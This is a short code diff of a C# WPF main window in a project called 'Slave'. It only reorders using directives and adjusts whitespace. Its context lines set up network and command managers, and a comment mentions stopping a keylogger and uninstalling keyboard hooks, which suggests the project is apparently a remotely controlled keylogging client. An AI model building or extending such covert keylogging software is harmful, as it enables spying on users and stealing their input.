@@ -1,7 +1,7 @@
-﻿using System.Threading.Tasks;
-using System.Windows;
-using Slave.Commands.Core;
+﻿using Slave.Commands.Core;
 using Slave.Core;
+using System.Threading.Tasks;
+using System.Windows;
 
 namespace Slave
 {
@@ -15,7 +15,7 @@ namespace Slave
         public MainWindow()
         {
             InitializeComponent();
-            
+
             manager = new SlaveManager();
             manager.networkManager = new SlaveNetworkManager();
             manager.commandsManager = new SlaveCommandsManager(manager.networkManager);
@@ -33,7 +33,6 @@ namespace Slave
             }
             mainTask.Start();
         }
-
 
         /// <summary>
         /// When the application is exiting, stop the keylogger (uninstall keyboard hooks)
